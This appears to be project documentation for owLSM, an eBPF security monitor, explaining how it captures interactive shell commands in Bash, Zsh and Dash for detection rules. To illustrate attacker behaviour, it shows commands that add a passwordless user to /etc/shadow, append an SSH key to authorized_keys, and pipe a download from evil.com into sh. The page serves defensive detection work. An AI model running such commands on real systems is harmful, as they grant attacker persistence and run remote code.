---
layout: default
title: Shell Command Monitoring (Beta)
parent: Architecture
nav_order: 5
---

# Shell Command Monitoring (Beta)


owLSM captures commands typed in interactive shell sessions using eBPF uprobes. This populates the `process.shell_command` field (and its `parent_process` / `target.process` variants) which can be used in rules for detection.  
This feature was originally added due to lack of visibility into shell built-in commands.
For example, in many scenarios attackers and red teams do something similar:
```
# creating a user
echo "attacker::0:99999:7:::" >> /etc/shadow

# creating a key
echo "ssh-rsa AAA...." >> ~/.ssh/authorized_keys
```

Due to how shell built-in commands work, we won't see any `EXEC` events as the shell process does the writing itself.
On top of that, we won't see anything useful in the shell process command line, as this isn't its command line — it's just input it receives via `stdin`.

The actual and almost only event we will see will be something like this:
```
# pseudo event
type: WRITE
process: /bin/bash
cmd: bash
target file: /etc/shadow
```

After solving the "built-in command visibility" issue, we realized how much extra value this provides.
It helps security teams build the full picture.
For example, a large chained shell command with URLs, base64, strings, etc. can trigger hundreds of syscalls. With `shell_command`, the security team has a much clearer picture of what caused all those events.

## How It Works

```
┌──────────────────────────────────────────────────────────────┐
│              Interactive Shell Session                        │
│   user types: "curl http://evil.com | sh"                    │
└──────────────────┬───────────────────────────────────────────┘
                   ▼
┌──────────────────────────────────────────────────────────────┐
│              eBPF Uprobe                                      │
│   Attached to shell-specific internal functions               │
│   Captures the command string from the shell's memory         │
└──────────────────┬───────────────────────────────────────────┘
                   ▼
┌──────────────────────────────────────────────────────────────┐
│              Process Cache                                    │
│   shell_command field updated for the shell's PID             │
│   Available for rule matching on all subsequent events        │
└──────────────────┬───────────────────────────────────────────┘
                   ▼
┌──────────────────────────────────────────────────────────────┐
│              Cleanup                                          │
│   shell_command is cleared when the command finishes          │
│   (next prompt) or when the shell process exits               │
└──────────────────────────────────────────────────────────────┘
```

## Supported Shells

| Shell | hook points | extra info |
|-------|-----------|-----------------|
| **Bash** | `readline` entry, `readline` exit |  |
| **Zsh**  | `zleentry` entry, `parse_event` entry, `zleentry` exit | |
| **Dash** | `setprompt` enter, `list` exit | Only supports official releases of Ubuntu, Debian, and Mint |

We would love the community to expand this list by contributing to the project and adding end-to-end support for more shell types.

## How Each Shell Is Supported
### Bash
Official releases of Bash export a few functions. One of them is `readline`, which is called in interactive Bash sessions.
`readline` returns the command as a string. It is typically called again only when the previous command has finished running and Bash is ready to handle a new one.
We use `readline` to set and clean the `process.shell_command` of the relevant process in the process cache.

### Zsh
Official releases of Zsh export a few functions, including `zleentry` and `parse_event`.
`zleentry` returns the command as a string, so we use it to set `process.shell_command`.
We use the combination of `zleentry` entry and `parse_event` entry to clean the `process.shell_command`.


### Dash
Supporting Dash was painful. It is missing two important things that were available in the other shells:
1. **No function that returns the full command as a string** — Dash never holds the full command as a string. It reads characters and populates a parse tree. We had to traverse the tree in eBPF and reconstruct the string (arguably the hardest thing to do in eBPF). Due to this limitation, the reconstructed string may not be a perfect reproduction of the original input, but the logic visible in `process.shell_command` will be correct. This should have an insignificant effect on users.
2. **No symbols** — Dash doesn't export any symbols. We had to maintain an offline database of all official Dash releases. The database holds:

| Build ID | Offsets to hook | Metadata |

At runtime, we extract the build ID of the target shell and get the relevant offsets to hook. To add support for more distros, their Dash release info needs to be added to the database.

The uprobe on `setprompt` marks the PID as interactive and clears `process.shell_command`. The uretprobe on `list` walks the parse tree to reconstruct the full command string, sanitizes Dash-specific control characters, and updates the process cache.

---

## Finding Shells to Hook
There are two phases of finding shells to hook:
1. At startup, we scan `/etc/shells` and add the relevant shells to a database. Then we hook all the shells in the database.  
2. At runtime, the userspace component inspects events to detect shell binaries that weren't listed in `/etc/shells`. If any are found, they are added to the database and hooked as well.

---

## What Gets Monitored

**Only interactive shell sessions are monitored.** The following aren't monitored:
- Shell scripts
- Subshells spawned by scripts
- Non-interactive sessions (e.g., `ssh host "command"`)
- Cron jobs, systemd services

**Missing the first command**
- If a shell session was opened before owLSM started monitoring, owLSM will miss the first command.
- Shells that weren't listed in `/etc/shells` and that owLSM has never seen before will miss the first command (they are discovered and hooked upon the first observed event).

---